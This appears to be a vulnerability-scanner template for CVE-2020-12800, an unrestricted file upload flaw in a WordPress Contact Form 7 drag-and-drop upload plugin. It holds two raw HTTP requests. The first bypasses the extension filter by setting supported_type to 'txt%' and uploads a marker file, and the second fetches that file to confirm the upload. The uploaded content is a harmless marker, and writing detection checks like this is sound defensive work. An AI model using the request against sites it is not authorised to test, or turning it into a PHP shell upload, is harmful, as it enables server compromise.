id: CVE-2020-12800
info:
  name: WordPress Contact Form 7 <1.3.3.3 - Remote Code Execution
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - wordpress
  - wp-plugin
  - fileupload
  - wp
  - rce
  description: |+
    WordPress Plugin Drag and Drop Multi File Upload - Contact Form 代码问题导致文件上传漏洞
    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。Drag and Drop Multi File Upload - Contact Form是使用在其中的一个拖放式文件上传和联系表单插件。

    WordPress Drag and Drop Multi File Upload - Contact Form 7 1.3.3.3之前版本中存在安全漏洞。攻击者可通过将supported_type设置为php\\%利用该漏洞上传php shells，执行代码。

  reference:
  - https://nvd.nist.gov/vuln/detail/cve-2020-12800
  - https://github.com/amartinsec/cve-2020-12800
  - https://packetstormsecurity.com/files/157951/wordpress-drag-and-drop-multi-file-uploader-remote-code-execution.html
  - https://wordpress.org/plugins/drag-and-drop-multiple-file-upload-contact-form-7/#developers
  severity: critical
  classification:
    cve-id:
    - cve-2020-12800
    cwe-id:
    - cwe-434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.codedropz.com/
requests:
- matchers:
  - type: word
    part: body_2
    words:
    - CVE-2020-12800-{{randstr}}
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=---------------------------350278735926454076983690555601
    X-Requested-With: XMLHttpRequest

    -----------------------------350278735926454076983690555601
    Content-Disposition: form-data; name="supported_type"

    txt%
    -----------------------------350278735926454076983690555601
    Content-Disposition: form-data; name="size_limit"

    5242880
    -----------------------------350278735926454076983690555601
    Content-Disposition: form-data; name="action"

    dnd_codedropz_upload
    -----------------------------350278735926454076983690555601
    Content-Disposition: form-data; name="type"

    click
    -----------------------------350278735926454076983690555601
    Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.txt%"
    Content-Type: application/x-httpd-php

    CVE-2020-12800-{{randstr}}
    -----------------------------350278735926454076983690555601--
  - |
    GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.txt HTTP/1.1
    Host: {{Hostname}}
  req-condition: true
